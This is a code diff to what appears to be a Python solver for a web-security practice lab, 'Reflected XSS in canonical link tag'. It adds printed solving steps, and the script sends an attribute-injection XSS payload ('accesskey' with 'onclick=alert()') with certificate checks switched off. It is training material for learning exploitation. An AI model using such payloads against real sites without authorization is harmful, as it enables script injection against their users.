@@ -1,11 +1,15 @@
 import requests
 import urllib3
+from colorama import Fore
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 LAB_NAME = "Reflected XSS in canonical link tag"
 
 def run(url, payload, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Inject payload in the search query parameter\n2. The alert function will be called after pressing the correct key combinations\n""")
+
     payload = "?'accesskey='X'onclick='alert()"
     try:
         r = requests.get(url.rstrip('/') + payload, verify=False, proxies=proxies)
